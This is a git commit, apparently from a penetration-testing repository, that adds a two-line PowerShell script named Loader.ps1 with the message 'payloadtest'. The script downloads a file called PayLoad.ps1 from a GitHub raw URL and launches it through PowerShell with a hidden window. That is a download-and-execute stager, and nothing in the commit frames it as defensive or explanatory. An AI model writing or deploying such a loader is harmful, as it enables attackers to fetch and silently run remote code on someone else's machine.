c12185607eebf2271a26e3183ab65fa5006245e5
Felix-ote <fopteijnde@pi-ct.com>
2023-10-26 17:20:54 +0200

    payloadtest

---
+++ Loader.ps1
@@ -0,0 +1,2 @@
+Invoke-WebRequest -Uri "https://raw.githubusercontent.com/Felix-ote/PenDev/main/PayLoad.ps1" -OutFile $scriptPath
+Start-Process -FilePath powershell.exe -ArgumentList "-file $scriptPath -WindowStyle hidden"
